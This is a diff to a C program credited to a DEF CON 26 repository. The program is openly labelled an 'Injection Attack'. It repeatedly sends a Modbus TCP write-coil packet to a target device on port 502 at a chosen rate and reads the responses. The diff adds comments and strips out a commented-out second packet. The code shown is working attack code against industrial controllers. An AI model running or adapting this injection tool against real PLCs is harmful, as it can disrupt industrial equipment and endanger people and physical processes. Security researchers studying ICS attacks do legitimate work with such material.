@@ -1,3 +1,7 @@
+// original code can be found on https://github.com/thiagoralves/defcon26
+
+
+
 #include <ctype.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -29,6 +33,8 @@ void sleep_us(int microseconds)
 	nanosleep(&ts, NULL);
 }
 
+
+// function to receive the response of the target
 void *receive_packets(void *arguments)
 {
 	while(1)
@@ -96,7 +102,8 @@ int main(int argc, char **argv)
     }
     
     printf("Starting Injection Attack...\r\n");
-    
+    	
+	// time the program waits between two pakets before sending them to the target
 	int sleep_time = 1000000/frequency;
 	
 	int socket_fd, port = 502;
@@ -105,10 +112,8 @@ int main(int argc, char **argv)
 	int data_len;
 	socklen_t cli_len;
 	char *hostaddr;
-    //Modbus TCP packet {  TransID |   ProtID  |   MsgLen  | UID |  FC |        Data           }  
+    	//Modbus TCP packet {  TransID |   ProtID  |   MsgLen  | UID |  FC |        Data           }  
 	char packet1[] =    {0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0x00, 0x00};
-   // char packet2[] =    {0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x06, 0x00, 0x05, 0x00, 0x01};
-	//char localBuffer1[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x2b, 0x0e, 0x02, 0x00};
 	
 	while(1) 
 	{
@@ -160,7 +165,7 @@ int main(int argc, char **argv)
 
 		while(1)
         {
-            /******** SEND PACKET 1 ********/
+            /******** SEND PACKET********/
             data_len = sendto(socket_fd, packet1, sizeof(packet1), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
             if (data_len < 0)
             {
@@ -179,27 +184,6 @@ int main(int argc, char **argv)
             }
             
             sleep_us(sleep_time);
-            
-            /******** SEND PACKET 2 ********/
-          //  data_len = sendto(socket_fd, packet2, sizeof(packet2), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-          //  if (data_len < 0)
-          //  {
-          //      printf("Error sending data on socket %d\n", socket_fd);
-          //      perror("error: ");
-          //  }
-          //  
-          //  else if (data_len > 0)
-          //  {
-          //      printf("Sent: ");
-          //      for (int i = 0; i < data_len; i++)
-           //     {
-          //          printf("%02x ", packet2[i]);
-          //      }
-          //      printf("\n");
-          //  }
-          //  
-          //  sleep_us(sleep_time);
-		}
 		
 		pthread_cancel(rcv_thread);
 
